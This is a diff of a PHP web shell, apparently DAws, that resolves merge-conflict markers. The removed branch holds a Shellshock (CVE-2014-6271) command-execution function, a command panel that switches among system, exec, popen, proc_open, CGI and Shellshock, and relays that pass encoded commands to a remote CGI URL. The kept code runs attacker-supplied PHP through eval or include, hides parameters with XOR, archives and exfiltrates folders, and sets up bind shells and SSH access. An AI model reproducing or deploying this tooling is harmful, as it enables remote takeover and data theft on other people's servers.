@@ -436,7 +436,6 @@ if (!isset($_SESSION["daws_directory"]))
 
 		foreach ($locations as $location)
 		{
-<<<<<<< HEAD
 			//uses the recursive glob function for old php versions
 			if (disabled_php("glob") == False)
 			{
@@ -464,58 +463,12 @@ if (!isset($_SESSION["daws_directory"]))
 			{
 				break;
 			}
-=======
-			$stdout = stream_get_contents($pipes[1]);
-			$stderr = stream_get_contents($pipes[2]);
-			fclose($pipes[1]);
-			fclose($pipes[2]);
-			proc_close($process);
-		}
-
-		if ($stderr != "")
-		{
-			echo $stderr;
-		}
-		else
-		{
-			echo $stdout;
-		}
-	}
-	else if($shellshock == True)
-	{
-		echo shellshock($command);
-	}
-	else if($cgi == True)
-	{
-		$command = base64encoding($command);
-		if ($curl_version == True)
-		{
-			echo url_get_contents($_SESSION["onlinecgi"]."?command=$command");
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 		}
 	}
 }
 
-<<<<<<< HEAD
 //drop our php.ini and .htaccess in DAws's directory
 if (!isset($_SESSION["dropped"]))
-=======
-function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
-	if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
-		$tmp = tempnam(".","data");
-		putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
-		mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
-	}
-	else return "Er 1";
-	$output = @file_get_contents($tmp);
-	@unlink($tmp);
-	if($output != "") return $output;
-	else return "Er 2";
-}
-
-#Zips Windows Dir-->
-function zipWindows($zip_location, $folder)
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 {
 	//what comes next will only matter if suphp is installed
 
@@ -609,25 +562,7 @@ function read_file($location)
 	}
 }
 
-<<<<<<< HEAD
 function url_get_contents($url) //used to download the source of a webpage
-=======
-if (shellshock("pwd") != "Er 1" || shellshock("pwd") != "Er 2")
-{
-	$shellshock = True;
-}
-else
-{
-	$shellshock = False;
-}
-
-#CGI Incoming-->
-$_SESSION["onlinecgi"] = "";
-$_SESSION["cgi"] = False;
-$cgi = False;
-
-if ($_SESSION["cgi"] == False)
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 {
 	if ((installed_php("curl_version") == True) && (disabled_php("curl_init") == False))
 	{
@@ -1326,7 +1261,6 @@ function execute_php($code, $output_needed) //eval and its substitutes
 {
 	if (!get_php_ini("suhosin.executor.disable_eval")) //we use eval since it's not blocked by suhosin
 	{
-<<<<<<< HEAD
 		eval($code);
 	}
 	else if ((disabled_php("include") == False) || (disabled_php("include_once") == False) || (disabled_php("require") == False) || (disabled_php("require_once") == False)) //lets the bodies hit the floor!
@@ -1334,37 +1268,6 @@ function execute_php($code, $output_needed) //eval and its substitutes
 		$code = "<?php\n".$code."\n?>";
 		$filename = $_SESSION["daws_directory"]."/".rand(1, 1000).".php";
 		write_to_file($filename, $code);
-=======
-		if(is_dir(unxor_this($_GET["zip"])))
-		{
-			if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
-			{	
-				$folder = array_pop(explode("/", unxor_this($_GET['zip'])));
-
-				$file = $folder . ".zip";
-				
-				zipWindows($file, unxor_this($_GET['zip']));
-
-				chmod($file, 644);
-				header('Content-Description: File Transfer');
-				header('Content-Type: application/octet-stream');
-				header('Content-Disposition: attachment; filename='.basename($file));
-				header('Expires: 0');
-				header('Cache-Control: must-revalidate');
-				header('Pragma: public');
-				header('Content-Length: ' . filesize($file));
-				ob_clean();
-				flush();
-				readfile($file);	
-			}
-			else
-			{
-				if(evalRel("zip -r $archiveName $archiveName")=="False")
-				{
-					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system', 'passthru', `popen`, `proc_open`, 'shellshock', and `cgi` are Disabled.</p>";
-					$zipFail = True;
-				}
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 
 		include_php($filename);
 	}
@@ -1609,38 +1512,10 @@ else if (isset($_POST['zip'])) //zips a folder; multiple methods
 			execute_command("zip -r ".$_SESSION["daws_directory"]."/".basename($location).".zip $location");
 		}
 	}
-<<<<<<< HEAD
-=======
-}
-
-#Commander-->
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
-{
-echo "
-<br><h3><A NAME='Commander' href=\"#Commander\">Commander</A></h3>";
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 
 	$_POST['dir'] = $_POST['old_dir'];
 }
-<<<<<<< HEAD
 else if (isset($_POST['new_name'])) //renames a file
-=======
-
-echo "
-<form action='#Commander' method='POST'>";
-
-if(isset($_POST["system"])) $_SESSION["command_function"] = "system";
-if(isset($_POST["shell_exec"])) $_SESSION["command_function"] = "shell_exec";
-if(isset($_POST["exec"])) $_SESSION["command_function"] = "exec";
-if(isset($_POST["passthru"])) $_SESSION["command_function"] = "passthru";
-if(isset($_POST["popen"])) $_SESSION["command_function"] = "popen";
-if(isset($_POST["proc_open"])) $_SESSION["command_function"] = "proc_open";
-if(isset($_POST["cgi"])) $_SESSION["command_function"] = "cgi";
-if(isset($_POST["shellshock"])) $_SESSION["command_function"] = "shellshock";
-if(!isset($_SESSION["command_function"])) $_SESSION["command_function"] = "system";
-
-if($system == True)
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 {
 	$old_name = unxor_this($_POST['old_name']);
 	$new_name = unxor_this($_POST['old_dir'])."/".unxor_this($_POST['new_name']);
@@ -1693,25 +1568,7 @@ else if (isset($_POST["mkdir"])) //creates a directory
 {
 	$location = unxor_this($_POST["old_dir"])."/".unxor_this($_POST["mkdir"]);
 
-<<<<<<< HEAD
 	mkdir($location);
-=======
-	echo "> ";
-}
-if ($shellshock == True)
-{
-	echo '<input type="submit" name="shellshock" value="shellshock" '; 
-	
-	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shellshock")
-	{
-		echo ' style="background-color: red;"';
-	}
-
-	echo "> ";
-}
-echo "
-</form>
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 
 	$_POST['dir'] = $_POST['old_dir'];
 }
@@ -1813,7 +1670,6 @@ else if ((isset($_POST["ssh_user"])) && file_exists($_SESSION["daws_directory"].
 				}
 				else
 				{
-<<<<<<< HEAD
 					$everything_ready = False;
 				}
 			}
@@ -1821,24 +1677,6 @@ else if ((isset($_POST["ssh_user"])) && file_exists($_SESSION["daws_directory"].
 		else
 		{
 			$everything_ready = False;
-=======
-					$response = file_get_contents($_SESSION["onlinecgi"]."?command=$decCommand");
-				}				
-				$decCommand = base64decoding($decCommand);
-			}
-
-			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shellshock")
-			{
-				$response = shellshock($decCommand." 2>&1");
-			}
-
-			echo "<table class='flat-table flat-table-1'>";
-			echo "<tr><td>".$decCommand."</td>";
-			echo "<td><pre>";
-			echo strip_tags($response);
-			echo "</pre></td></tr>";
-			echo "</table>";
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 		}
 
 		if ($everything_ready == True)
@@ -1951,17 +1789,12 @@ if (isset($_POST['dir'])) //gets the proper value of 'dir'
 		$dir = substr($dir, 0, $size - 1);
 		$size = strlen($dir);
 	}
-<<<<<<< HEAD
 }
 else
 {
 	$dir = $_SERVER["SCRIPT_FILENAME"];
 	$size = strlen($dir);
 	while ($dir[$size - 1] != '/')
-=======
-	
-	if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 	{
 		$dir = substr($dir, 0, $size - 1);
 		$size = strlen($dir);
@@ -2154,19 +1987,15 @@ function show_div(div_name) //used by the 'rename' form in the file manager to s
 	if ($_SESSION["windows"] == False) //no posix in Windows
 	{
 		//I had to store the result because else it was causing a syntax error on a Windows machine
-		if (function_exists('posix_getpwuid'))
-		{
-			$process_owner = posix_getpwuid(posix_geteuid());
+		$process_owner = posix_getpwuid(posix_geteuid());
 
-			echo "
-			<tr>
-				<td>Process Owner</td>
-				<td>".$process_owner["name"]."</td>
-			</tr>";
-		}
+		echo "
+		<tr>
+			<td>Process Owner</td>
+			<td>".$process_owner["name"]."</td>
+		</tr>";
 	}
 
-<<<<<<< HEAD
 	echo "
 	<tr>
 		<td>Script Owner</td>
@@ -2176,13 +2005,6 @@ function show_div(div_name) //used by the 'rename' form in the file manager to s
 		<td>Disk Total Space</td>
 		<td>".floor((disk_total_space(realpath("/")))/(1073741824))." GB</td>
 	</tr>";
-=======
-#Process Manager-->
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
-{
-echo "
-<br><br><h3><A NAME='Process Manager' href=\"#Process Manager\">Process Manager</A></h3>";
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 
 if ($_SESSION["windows"] == True) //not always working and causing the shell to load slowly, maybe later...
 {
@@ -2765,11 +2587,7 @@ echo "
 		</tr>
 	</form>";
 
-<<<<<<< HEAD
 if ((isset($_SESSION["mysqli"])) && ($_SESSION["mysqli"] == True))
-=======
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 {
 	echo "
 	<form action='#Sql Connect 'method='post' onsubmit=\"xorencr(['sql_execute'])\">
@@ -2800,7 +2618,6 @@ echo "
 <table class='flat-table' style='table-layout: fixed;'>
 <form method='post' action='#Bind Shells' onsubmit=\"xorencr(['bind_port'])\">
 	<tr>
-<<<<<<< HEAD
 		<td style='padding: 1%'>
 			Info:
 			<input name='bind_port' id='bind_port' placeholder='Port' type='text'/>
@@ -2828,16 +2645,6 @@ echo "
 </table>";
 
 if ($_SESSION["windows"] == False) //linux only for now
-=======
-		<td>Name</td>
-		<td>Language</td>
-		<td>Author</td>
-		<td>Goal</td>
-		<td>Description</td>
-		<td>Action</td>
-	</tr>";
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
->>>>>>> 7fb02bcbb38ce7bc0a6b6a64f2b5eead5e6351ad
 {
 	echo "
 	<h3><A NAME='Setup SSH' href='#Setup SSH'>Setup SSH</A></h3>
